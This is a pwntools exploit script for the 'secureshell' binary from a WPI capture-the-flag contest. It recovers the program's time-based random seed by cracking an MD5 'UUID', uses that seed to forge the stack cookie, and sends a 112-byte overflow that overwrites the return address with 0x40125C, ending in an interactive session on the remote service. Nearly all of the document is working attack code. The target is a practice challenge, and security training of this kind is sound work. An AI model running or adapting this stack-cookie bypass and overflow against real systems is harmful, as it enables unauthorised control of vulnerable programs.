#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('secureshell')

host = args.HOST or 'secureshell.wpictf.xyz'
port = int(args.PORT or 31337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b *0x40142D
continue
'''.format(**locals())

# -- Exploit goes here --

import ctypes
_gettimeofday = None
def gettimeofday():
    global _gettimeofday

    if not _gettimeofday:
            _gettimeofday = ctypes.cdll.LoadLibrary("libc.so.6").gettimeofday

    class timeval(ctypes.Structure):
            _fields_ = \
            [
                    ("tv_sec", ctypes.c_int32),
                    ("tv_usec", ctypes.c_int32)
            ]

    tv = timeval()

    _gettimeofday(ctypes.byref(tv), None)

    return ctypes.c_int32(tv.tv_usec + ctypes.c_int32(1000000 * tv.tv_sec).value).value

gettimeofday()
libc = ctypes.cdll.LoadLibrary("libc.so.6")
srand = libc.srand
rand = libc.rand

context.terminal = ['tmux', 'split', '-h']

ctime = gettimeofday()
log.info("Start time: " + hex(ctypes.c_uint32(ctime).value))

from hashlib import md5
def hash(ctime):
    srand(ctime)
    rand()
    rand()
    return md5(p32(rand())).hexdigest()

io = start()
io.recv()
io.sendline("abc")
io.recvuntil('UUID: ')
target = io.recvline().strip()
log.info("Target hash: " + target)

cracker=process('./md5')
cracker.sendline(str(ctime))
cracker.sendline(target)
data=cracker.recvline()
cracker.close()

data=data.strip().split(' ')
ctime=int(data[1],16)
log.info(hex(ctime))

libc.srand(ctime)
rand()
rand()
rand()
a=rand()<<32
b=rand()
c=a^b
cookie=p64(c)
log.info("cookie {} {}".format(hex(c), cookie))
io.recv()
io.sendline("A" * 112 + cookie + p64(0x40125C) * 2)

io.interactive()

